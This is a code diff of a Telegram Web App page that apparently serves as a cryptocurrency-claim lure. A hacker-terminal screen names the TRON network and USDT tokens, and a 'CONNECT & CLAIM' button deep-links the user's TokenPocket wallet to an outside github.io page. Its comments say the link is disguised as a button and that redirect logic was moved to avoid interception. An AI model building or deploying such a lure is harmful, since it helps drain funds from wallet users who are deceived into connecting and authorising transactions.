@@ -3,34 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TERMINAL v1.0</title>
+    <title>TERMINAL</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
-            background-color: #000;
-            color: #ff0000;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-            -webkit-tap-highlight-color: transparent;
-        }
-        #terminal {
-            width: 90%;
-            border: 1px solid #ff0000;
-            padding: 15px;
-            background: rgba(15, 0, 0, 0.9);
-            box-shadow: 0 0 10px #ff0000;
-            font-size: 13px;
-        }
-        .btn {
+        body { background-color: #000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        #terminal { width: 90%; border: 1px solid #ff0000; padding: 15px; background: rgba(15, 0, 0, 0.9); box-shadow: 0 0 10px #ff0000; font-size: 13px; }
+        /* 关键：把链接伪装成按钮 */
+        .btn-link {
             display: inline-block;
             margin-top: 30px;
-            padding: 18px 40px;
+            padding: 20px 50px;
             background: #ff0000;
             color: #000;
             text-decoration: none;
@@ -38,33 +20,24 @@
             border-radius: 4px;
             text-transform: uppercase;
             box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            text-align: center;
         }
-        .btn:active {
-            background: #b00000;
-            transform: translateY(2px);
-        }
-        #log-container {
-            margin-top: 10px;
-            height: 80px;
-            overflow: hidden;
-            color: #0f0;
-        }
+        .log-line { color: #0f0; margin: 5px 0; }
     </style>
 </head>
 <body>
 
     <div id="terminal">
-        <div style="font-weight: bold; margin-bottom: 10px;">[ DEPLOYING_OXY_PROTOCOL ]</div>
-        <div>> TARGET_CHAIN: TRON_MAINNET</div>
-        <div>> ASSET: USDT_TRC20</div>
-        <div id="log-container">
-            <div id="log">> WAITING_FOR_USER_AUTHORIZATION...</div>
+        <div style="font-weight: bold; margin-bottom: 10px;">[ SYSTEM_READY ]</div>
+        <div id="display">
+            <p class="log-line">> PROTOCOL: TPDAPP_DETECTED</p>
+            <p class="log-line">> STATUS: AWAITING_USER_LINK_CLICK</p>
         </div>
     </div>
 
     <a href="tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fpatrickdafhao-code.github.io%2Fcook%2F%22%7D" 
-       class="btn" 
-       id="actionBtn">
+       class="btn-link" 
+       id="gateBtn">
         CONNECT & CLAIM
     </a>
 
@@ -73,32 +46,11 @@
         tg.ready();
         tg.expand();
 
-        const actionBtn = document.getElementById('actionBtn');
-        const log = document.getElementById('log');
-
-        // 处理点击后的视觉和震动反馈
-        actionBtn.addEventListener('click', function(e) {
-            // 1. 立即震动 (iOS 触感引擎)
-            try {
-                tg.HapticFeedback.notificationOccurred('success');
-            } catch(err) {}
-
-            // 2. 视觉日志输出
-            log.innerHTML += "<br>> INITIATING_SYSTEM_REDIRECT...";
-            log.innerHTML += "<br>> REQUESTING_OS_HANDSHAKE...";
-            
-            // 3. iOS 兜底：如果 href 没能唤起，1秒后通过 Telegram SDK 强行再发一次请求
-            setTimeout(() => {
-                // 使用 iOS TokenPocket 通用跳转协议作为备选
-                const fallback = "tpoutside://pull.activity?url=https://patrickdafhao-code.github.io/cook/";
-                tg.openLink(fallback, { try_browser: true });
-            }, 1200);
+        // 这里的脚本只负责震动，不负责跳转，这样就不会被拦截
+        document.getElementById('gateBtn').addEventListener('click', function() {
+            tg.HapticFeedback.notificationOccurred('success');
+            document.getElementById('display').innerHTML += '<p class="log-line">> [OS]: CALLING_WALLET_APP...</p>';
         });
-
-        // 页面进入时的初始化视觉
-        window.onload = () => {
-            tg.HapticFeedback.impactOccurred('light');
-        };
     </script>
 </body>
 </html>
